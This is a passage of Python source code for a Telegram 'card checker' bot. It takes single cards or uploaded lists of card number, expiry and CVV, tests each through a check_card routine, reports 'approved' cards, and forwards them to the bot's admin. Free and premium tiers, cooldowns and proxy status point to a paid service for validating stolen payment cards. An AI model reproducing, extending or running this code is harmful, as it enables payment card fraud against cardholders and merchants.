        if re.match(r'^\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}$', raw_input):
            cc = raw_input
        else:
            # Try to normalize the card
            cc = normalize_card(raw_input)

            # If normalization failed, use the original input
            if not cc:
                cc = raw_input

    # Set cooldown for free users (30 seconds)
    if not is_admin(msg.from_user.id) and not is_premium(msg.from_user.id):
        set_cooldown(msg.from_user.id, "b3", 10)

    processing = bot.reply_to(msg, """

 ♻️  ⏳ PROCESSING ⏳  ♻️


• Your card is being checked...
• Please be patient, this may take a moment

✗ Do not send multiple requests""")

    def check_and_reply():
        try:
            result = check_card(cc)
            # Add user info and proxy status to the result
            user_info_data = get_user_info(msg.from_user.id)
            user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
            proxy_status = check_proxy_status()
            
            # Format the result with the new information
            formatted_result = result.replace(
                "⚡ Powered by : @mhitzxg & @pr0xy_xd",
                f"👤 Checked by: {user_info}\n"
                f"🔌 Proxy: {proxy_status}\n"
                f"⚡ Powered by: @mhitzxg & @pr0xy_xd"
            )
            
            bot.edit_message_text(formatted_result, msg.chat.id, processing.message_id, parse_mode='HTML')
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {str(e)}", msg.chat.id, processing.message_id)

    threading.Thread(target=check_and_reply).start()

@bot.message_handler(commands=['mb3'])
def mb3_handler(msg):
    if not is_authorized(msg):
        return bot.reply_to(msg, """

🔰 AUTHORIZATION REQUIRED 🔰
 

• You are not authorized to use this command
• Only authorized users can check cards

✗ Contact an admin for authorization
• Admin: @mhitzxg""")

    # Check for cooldown (30 minutes for free users)
    if check_cooldown(msg.from_user.id, "mb3"):
        return bot.reply_to(msg, """

 ⏰ COOLDOWN ACTIVE ⏰


• You are in cooldown period
• Please wait 30 minutes before mass checking again

✗ Upgrade to premium to remove cooldowns""")

    if not msg.reply_to_message:
        return bot.reply_to(msg, """

  ⚡ INVALID USAGE ⚡


• Please reply to a .txt file with /mb3
• The file should contain card details

✗ Contact admin if you need help: @mhitzxg""")

    reply = msg.reply_to_message

    # Detect whether it's file or raw text
    if reply.document:
        file_info = bot.get_file(reply.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text = downloaded_file.decode('utf-8', errors='ignore')
    else:
        text = reply.text or ""
        if not text.strip():
            return bot.reply_to(msg, "❌ Empty text message.")

    # Extract CCs using improved normalization
    cc_lines = []
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue

        # Try to normalize each line
        normalized_cc = normalize_card(line)
        if normalized_cc:
            cc_lines.append(normalized_cc)
        else:
            # Fallback to original regex patterns
            found = re.findall(r'\b(?:\d[ -]*?){13,16}\b.*?\|.*?\|.*?\|.*', line)
            if found:
                cc_lines.extend(found)
            else:
                parts = re.findall(r'\d{12,16}[|: -]\d{1,2}[|: -]\d{2,4}[|: -]\d{3,4}', line)
                cc_lines.extend(parts)

    if not cc_lines:
        return bot.reply_to(msg, """

 ❌ NO VALALID CARDS ❌


• No valid card formats found the file
• Please check the file format

Valid format:
`4556737586899855|12|2026|123`

✗ Contact admin if you need help: @mhitzxg""")

    # Check card limit for free users (20 cards)
    user_id = msg.from_user.id
    if not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 20:
        return bot.reply_to(msg, f"""

 ❌ LIMIT EXCEEDED ❌


• Free users can only check 20 cards at once
• You tried to check {len(cc_lines)} cards


💰 UPGRADE TO PREMIUM 💰


• Upgrade to premium for unlimited checks
• Use /subscription to view plans
• Contact @mhitzxg to purchase""")

    # Check if it's a raw paste (not a file) and limit for free users
    if not reply.document and not is_admin(user_id) and not is_premium(user_id) and len(cc_lines) > 15:
        return bot.reply_to(msg, """

 ❌ TOO MANY CARDS ❌


• You can only check 15 cards in a message
• Please use a .txt file for larger checks""")

    # Set cooldown for free users (30 minutes)
    if not is_admin(user_id) and not is_premium(user_id):
        set_cooldown(user_id, "mb3", 1800)  # 30 minutes = 1800 seconds

    total = len(cc_lines)
    user_id = msg.from_user.id

    # Determine where to send messages (group or private)
    chat_id = msg.chat.id if msg.chat.type in ["group", "supergroup"] else user_id

    # Initial Message with Inline Buttons
    kb = InlineKeyboardMarkup(row_width=1)
    buttons = [
        InlineKeyboardButton(f"Approved 0 ✅", callback_data="none"),
        InlineKeyboardButton(f"Declined 0 ❌", callback_data="none"),
        InlineKeyboardButton(f"Checked 0 📊", callback_data="none"),
        InlineKeyboardButton(f"Total {total} 📋", callback_data="none"),
    ]
    for btn in buttons:
        kb.add(btn)

    status_msg = bot.send_message(chat_id, """

♻️ ⏳ PROCESSING CARDS ⏳ ♻️


• Mass check in progress...
• Please wait, this may take some time

⚡ Status will update automatically""", reply_markup=kb)

    approved, declined, checked = 0, 0, 0
    approved_cards = []  # To store all approved cards

    def process_all():
        nonlocal approved, declined, checked, approved_cards
        for cc in cc_lines:
            try:
                checked += 1
                result = check_card(cc.strip())
                if "APPROVED CC ✅" in result:
                    approved += 1
                    # Add user info and proxy status to approved cards
                    user_info_data = get_user_info(msg.from_user.id)
                    user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
                    proxy_status = check_proxy_status()
                    
                    formatted_result = result.replace(
                        "⚡ Powered by : @mhitzxg & @pr0xy_xd",
                        f"👤 Checked by: {user_info}\n"
                        f"🔌 Proxy: {proxy_status}\n"
                        f"⚡ Powered by: @mhitzxg & @pr0xy_xd"
                    )
                    
                    approved_cards.append(formatted_result)  # Store approved card
                    
                    # Send approved card immediately
                    approved_message = f"""
╔═══════════════════════╗
       ✅ APPROVED CARD FOUND ✅
╚═══════════════════════╝

{formatted_result}

• Approved: {approved} | Declined: {declined} | Checked: {checked}/{total}
"""
                    bot.send_message(chat_id, approved_message, parse_mode='HTML')
                    
                    if MAIN_ADMIN_ID != user_id:
                        bot.send_message(MAIN_ADMIN_ID, f"✅ Approved by {user_id}:\n{formatted_result}", parse_mode='HTML')
                else:
                    declined += 1

                # Update inline buttons
                new_kb = InlineKeyboardMarkup(row_width=1)
                new_kb.add(
                    InlineKeyboardButton(f"Approved {approved} ✅", callback_data="none"),
                    InlineKeyboardButton(f"Declined {declined} ❌", callback_data="none"),
                    InlineKeyboardButton(f"Checked {checked} 📊", callback_data="none"),
                    InlineKeyboardButton(f"Total {total} 📋", callback_data="none"),
                )
                bot.edit_message_reply_markup(chat_id, status_msg.message_id, reply_markup=new_kb)
                time.sleep(2)
            except Exception as e:
                bot.send_message(user_id, f"❌ Error: {e}")

        # After processing all cards, send the final summary
        user_info_data = get_user_info(msg.from_user.id)
        user_info = f"{user_info_data['username']} ({user_info_data['user_type']})"
        proxy_status = check_proxy_status()
        
        final_message = f"""
╔═══════════════════════╗
      📊 CHECK COMPLETED 📊
╚═══════════════════════╝

• All cards have been processed
• Approved: {approved} | Declined: {declined} | Total: {total}

👤 Checked by: {user_info}
🔌 Proxy: {proxy_status}

✗ Thank you for using our service"""
        
        bot.send_message(chat_id, final_message)

    threading.Thread(target=process_all).start()

# ---------------- Start Bot ---------------- #
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = threading.Thread(target=run)
    t.start()

keep_alive()
bot.infinity_polling()
